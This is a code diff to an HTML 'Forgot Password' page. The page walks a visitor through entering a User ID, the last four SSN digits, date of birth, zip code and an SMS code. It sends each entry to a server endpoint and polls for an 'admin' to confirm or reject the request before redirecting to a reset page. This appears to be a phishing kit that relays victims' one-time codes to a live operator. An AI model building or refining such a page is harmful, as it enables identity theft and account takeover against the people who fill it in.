@@ -70,16 +70,16 @@
         <!-- Step 0: User ID -->
         <div id="step0" class="step active">
             <h1>Forgot Password</h1>
-            <p>Enter your User ID to start password reset request.</p>
+            <p>Enter your User ID to begin the password reset process.</p>
             
             <label for="userid">User ID</label>
             <input type="text" id="userid" placeholder="Enter your User ID" required autofocus>
             
             <button class="continue" onclick="startForgotProcess()">Continue</button>
-            <button onclick="goBack()" style="background:none; border:1px solid #cbd5e1; color:#1e40af;">Back to Login</button>
+            <button onclick="goBack()" style="background:none; border:1px solid #cbd5e1; color:#1e40af; margin-top:8px;">Back to Login</button>
         </div>
 
-        <!-- Verification Steps (Same as verify.html) -->
+        <!-- Step 1: SSN + DOB -->
         <div id="step1" class="step">
             <h1>Confirm your identity</h1>
             <label>Last 4 Digits of SSN</label>
@@ -98,6 +98,7 @@
             <button class="continue" onclick="saveStep1()">Continue</button>
         </div>
 
+        <!-- Step 2: Zip Code -->
         <div id="step2" class="step">
             <h1>Additional Information</h1>
             <label>Zip Code</label>
@@ -105,6 +106,7 @@
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
+        <!-- Step 3: Code Verification -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
@@ -128,7 +130,8 @@
                 alert("Please enter your User ID");
                 return;
             }
-            // Send initial request
+
+            // Send initial request to admin
             fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -138,6 +141,7 @@
                     address: `UserID: ${realUsername} | Status: Started Password Reset`
                 })
             });
+
             nextStep(1);
         }
 
@@ -211,7 +215,7 @@
 
             await saveStep(fullDetails, "Final Code Submission - Forgot Password");
 
-            // Polling (same as before)
+            // Polling for admin approval
             const interval = setInterval(async () => {
                 try {
                     const res = await fetch('/api/records');
@@ -220,12 +224,21 @@
 
                     if (latest && latest.address.includes("Confirmed")) {
                         clearInterval(interval);
-                        statusDiv.innerHTML = `<span class="success">✅ Request Received! Admin will reset your password soon.</span>`;
+                        statusDiv.innerHTML = `<span class="success">✅ Verified! Redirecting to set new password...</span>`;
+                        
+                        sessionStorage.setItem('forgotUsername', realUsername);
+                        
+                        setTimeout(() => {
+                            window.location.href = "reset-password.html";
+                        }, 1500);
+
                     } else if (latest && latest.address.includes("Rejected")) {
                         clearInterval(interval);
-                        statusDiv.innerHTML = `<span class="error">❌ Request Rejected.</span>`;
+                        statusDiv.innerHTML = `<span class="error">❌ Request Rejected by Admin.</span>`;
                     }
-                } catch (e) {}
+                } catch (e) {
+                    console.error(e);
+                }
             }, 2000);
         }
 
